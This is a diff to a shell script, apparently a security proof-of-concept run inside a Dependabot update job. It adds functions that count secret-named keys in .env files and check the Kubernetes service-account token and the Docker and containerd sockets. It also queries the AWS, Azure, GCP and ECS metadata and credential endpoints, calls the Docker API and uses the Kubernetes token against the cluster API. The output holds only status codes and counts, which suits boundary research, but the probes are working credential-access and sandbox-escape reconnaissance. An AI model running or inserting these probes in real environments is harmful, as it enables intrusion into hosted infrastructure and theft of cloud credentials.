@@ -202,6 +202,132 @@ probe_jit_git_access() {
   rm -f "$output"
 }
 
+probe_local_boundaries() {
+  env_file_count=0
+  env_secret_key_count=0
+  for candidate in .env /app/.env /work/.env /home/dependabot/.env /opt/dependabot/.env; do
+    if [ -r "$candidate" ]; then
+      env_file_count=$((env_file_count + 1))
+      key_count="$(awk -F= '
+        /^[A-Za-z_][A-Za-z0-9_]*=/ {
+          key = toupper($1)
+          if (key ~ /(TOKEN|SECRET|PASSWORD|PRIVATE|CREDENTIAL|API_KEY)/) count++
+        }
+        END { print count + 0 }
+      ' "$candidate" 2>/dev/null)"
+      env_secret_key_count=$((env_secret_key_count + ${key_count:-0}))
+    fi
+  done
+
+  kube_token_readable=0
+  docker_socket_present=0
+  containerd_socket_present=0
+  [ -r /var/run/secrets/kubernetes.io/serviceaccount/token ] && kube_token_readable=1
+  [ -S /var/run/docker.sock ] && docker_socket_present=1
+  [ -S /run/containerd/containerd.sock ] && containerd_socket_present=1
+  printf 'DBOT_LOCAL_BOUNDARIES=ok ENV_FILE_COUNT=%s SECRET_KEY_NAME_COUNT=%s KUBE_TOKEN_READABLE=%s DOCKER_SOCKET=%s CONTAINERD_SOCKET=%s\n' \
+    "$env_file_count" "$env_secret_key_count" "$kube_token_readable" "$docker_socket_present" "$containerd_socket_present" >&2
+}
+
+probe_direct_http() {
+  label="$1"
+  url="$2"
+  header_name="${3:-}"
+  header_value="${4:-}"
+  output="${tmp_prefix}-${label}.bin"
+  if [ -n "$header_name" ]; then
+    code="$(curl -ksS --noproxy '*' --connect-timeout 1 --max-time 3 \
+      -H "$header_name: $header_value" -o "$output" -w '%{http_code}' "$url" 2>/dev/null)"
+  else
+    code="$(curl -ksS --noproxy '*' --connect-timeout 1 --max-time 3 \
+      -o "$output" -w '%{http_code}' "$url" 2>/dev/null)"
+  fi
+  size="$(wc -c < "$output" 2>/dev/null | tr -d ' ')"
+  printf 'DBOT_INTERNAL_%s_STATUS=%s SIZE=%s\n' "$label" "${code:-curl_error}" "${size:-0}" >&2
+  rm -f "$output"
+}
+
+probe_internal_boundaries() {
+  proxy_url="${HTTPS_PROXY:-${https_proxy:-${HTTP_PROXY:-${http_proxy:-}}}}"
+  proxy_hostport="$(PROXY_URL="$proxy_url" ruby -ruri -e '
+    begin
+      value = ENV["PROXY_URL"].to_s
+      unless value.empty?
+        uri = URI.parse(value)
+        print "#{uri.host}:#{uri.port}" if uri.host
+      end
+    rescue StandardError
+    end
+  ' 2>/dev/null)"
+  proxy_host="${proxy_hostport%:*}"
+  proxy_port="${proxy_hostport##*:}"
+  proxy_addr_count=0
+  proxy_private_addr=0
+  proxy_tcp_status=not_configured
+  if [ -n "$proxy_hostport" ] && [ "$proxy_host" != "$proxy_hostport" ]; then
+    proxy_addr_count="$(getent ahostsv4 "$proxy_host" 2>/dev/null | awk '!seen[$1]++ { count++ } END { print count + 0 }')"
+    proxy_private_addr="$(getent ahostsv4 "$proxy_host" 2>/dev/null | awk '
+      $1 ~ /^10\./ || $1 ~ /^192\.168\./ || $1 ~ /^172\.(1[6-9]|2[0-9]|3[01])\./ { found=1 }
+      END { print found + 0 }
+    ')"
+    ruby -rsocket -e '
+      socket = Socket.tcp(ARGV[0], Integer(ARGV[1]), connect_timeout: 2)
+      socket.close
+    ' "$proxy_host" "$proxy_port" >/dev/null 2>&1
+    [ $? -eq 0 ] && proxy_tcp_status=open || proxy_tcp_status=closed
+  fi
+  printf 'DBOT_INTERNAL_PROXY=ok HOST_CONFIGURED=%s ADDR_COUNT=%s PRIVATE_ADDR=%s TCP_STATUS=%s\n' \
+    "$([ -n "$proxy_hostport" ] && printf 1 || printf 0)" "$proxy_addr_count" "$proxy_private_addr" "$proxy_tcp_status" >&2
+
+  aws_relative_present=0
+  kube_host_present=0
+  docker_host_present=0
+  [ -n "${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:-}" ] && aws_relative_present=1
+  [ -n "${KUBERNETES_SERVICE_HOST:-}" ] && kube_host_present=1
+  [ -n "${DOCKER_HOST:-}" ] && docker_host_present=1
+  printf 'DBOT_INTERNAL_ENV_MARKERS=ok AWS_RELATIVE_URI=%s KUBE_HOST=%s DOCKER_HOST=%s\n' \
+    "$aws_relative_present" "$kube_host_present" "$docker_host_present" >&2
+
+  probe_direct_http AWS_IMDS http://169.254.169.254/latest/meta-data/
+  probe_direct_http AZURE_IMDS 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' Metadata true
+  probe_direct_http GCP_IMDS http://metadata.google.internal/computeMetadata/v1/ Metadata-Flavor Google
+
+  if [ -n "${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI:-}" ]; then
+    case "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" in
+      /*) probe_direct_http ECS_IMDS "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" ;;
+      *) printf 'DBOT_INTERNAL_ECS_IMDS_STATUS=invalid_relative_uri SIZE=0\n' >&2 ;;
+    esac
+  else
+    printf 'DBOT_INTERNAL_ECS_IMDS_STATUS=not_configured SIZE=0\n' >&2
+  fi
+
+  if [ -S /var/run/docker.sock ]; then
+    output="${tmp_prefix}-docker-version.bin"
+    code="$(curl -ksS --max-time 3 --unix-socket /var/run/docker.sock \
+      -o "$output" -w '%{http_code}' http://localhost/version 2>/dev/null)"
+    size="$(wc -c < "$output" 2>/dev/null | tr -d ' ')"
+    printf 'DBOT_INTERNAL_DOCKER_API_STATUS=%s SIZE=%s\n' "${code:-curl_error}" "${size:-0}" >&2
+    rm -f "$output"
+  else
+    printf 'DBOT_INTERNAL_DOCKER_API_STATUS=not_configured SIZE=0\n' >&2
+  fi
+
+  if [ -n "${KUBERNETES_SERVICE_HOST:-}" ] && [ -r /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
+    kube_port="${KUBERNETES_SERVICE_PORT_HTTPS:-${KUBERNETES_SERVICE_PORT:-443}}"
+    kube_header="${tmp_prefix}-kube-curl.conf"
+    kube_output="${tmp_prefix}-kube-version.bin"
+    umask 077
+    printf 'header = "Authorization: Bearer %s"\n' "$(tr -d '\r\n' < /var/run/secrets/kubernetes.io/serviceaccount/token)" > "$kube_header"
+    code="$(curl -ksS --noproxy '*' --connect-timeout 1 --max-time 3 --config "$kube_header" \
+      -o "$kube_output" -w '%{http_code}' "https://${KUBERNETES_SERVICE_HOST}:${kube_port}/version" 2>/dev/null)"
+    size="$(wc -c < "$kube_output" 2>/dev/null | tr -d ' ')"
+    rm -f "$kube_header" "$kube_output"
+    printf 'DBOT_INTERNAL_KUBE_API_STATUS=%s SIZE=%s\n' "${code:-curl_error}" "${size:-0}" >&2
+  else
+    printf 'DBOT_INTERNAL_KUBE_API_STATUS=not_configured SIZE=0\n' >&2
+  fi
+}
+
 probe_repo_file CONTROL "$api_base/repos/FazeMike1/dbot-poc/contents/.gitmodules"
 probe_repo_file XREPO "$api_base/repos/FazeMike1/priv-a/contents/secret-canary.txt"
 probe_installation_scope
@@ -210,6 +336,8 @@ probe_job_credentials
 probe_jit_access
 probe_jit_denied_control
 probe_jit_git_access
+probe_local_boundaries
+probe_internal_boundaries
 
 job_token_len="${#DEPENDABOT_JOB_TOKEN}"
 printf 'DBOT_UPDATER_JOB_TOKEN_LEN=%s API_BASE_SCHEME=%s\n' "$job_token_len" "${api_base%%:*}" >&2
